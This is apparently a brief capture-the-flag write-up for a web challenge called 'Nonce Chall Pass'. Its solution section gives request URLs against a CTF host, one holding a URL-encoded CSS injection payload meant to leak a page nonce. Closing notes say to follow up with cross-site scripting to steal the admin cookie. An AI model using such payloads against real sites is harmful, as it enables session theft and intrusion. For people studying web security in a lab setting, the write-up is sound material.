# Nonce Chall Pass

Gandalf wants Kuchen too!

Hard

## Solution

http://localhost:8010/?contenturl=http://ctf.eno.host:8000/content.html&reporturl=http://ctf.eno.host:8010/&reporttime=2000
Take:

http://localhost:8010/report?contenturl=http://ctf.eno.host:8000/content.html&contenttime=2000&reporturl=http://ctf.eno.host:8010/&reporttime=1000&loadmsg=%3Cstyle%3Ebody::before{content:%20attr(nonc);}%3C/style%3E

> Extract image from report
> xss to get admin cookie.